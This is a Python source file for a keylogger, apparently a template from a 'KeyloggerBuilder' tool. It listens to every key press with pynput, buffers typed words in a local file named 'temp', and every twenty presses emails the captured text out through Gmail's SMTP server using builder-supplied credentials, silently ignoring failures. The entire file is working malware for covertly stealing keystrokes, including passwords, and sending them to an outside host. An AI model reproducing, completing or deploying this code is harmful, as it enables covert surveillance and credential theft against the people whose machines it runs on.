from pynput.keyboard import Key, Listener, KeyCode
from string import ascii_letters, digits
import smtplib

class Sender():
	USER = ''
	PASSWORD = ''
	msg = ''
	def __init__(self, user, passwd):
		self.USER = user
		self.PASSWORD = passwd
		self.msg = "\r\n".join([
			f"From: {self.USER}",
			f"To: {self.USER}",
			"Subject: KeyloggerBuilder",
			"",
			""
			])
	def send(self, data):
		self.msg = "\r\n".join([
			f"From: {self.USER}",
			f"To: {self.USER}",
			"Subject: KeyloggerBuilder",
			"",
			data
			])
		try:
			server = smtplib.SMTP('smtp.gmail.com:587')
			server.ehlo()
			server.starttls()
			server.login(self.USER, self.PASSWORD)
			server.sendmail(self.USER, self.USER, self.msg)
			server.quit()
		except Exception as e:
			pass


TEMP = ''
ALL_KEYS = []
NEW_KEYS = ''
COUNT_OF = 0

def sendData():
	s = Sender(QWERTYUIOP, ASDFGHJKL)
	with open('temp','r') as fl:
		s.send(fl.readline())

def logToFile(path):
	global NEW_KEYS
	if path is None:
		with open('temp','a') as fl:
			fl.write(str(NEW_KEYS))
			ALL_KEYS.append(NEW_KEYS)
			NEW_KEYS = ''
def logToVar(key):
	global NEW_KEYS
	global COUNT_OF
	global TEMP
	if type(key) == KeyCode and key.char in ascii_letters + digits:
		TEMP += key.char
	else:
		NEW_KEYS += TEMP + ' '
		TEMP = ''
	COUNT_OF += 1
	if COUNT_OF != 0:
		if COUNT_OF % 5 == 0:
			#print('[~] Saving to file...')
			logToFile(None)
	if COUNT_OF != 0:
		if COUNT_OF % 20 == 0: #flag
			#print('[~] Sending...')
			sendData()

with Listener(on_press=logToVar) as lis:
	lis.join()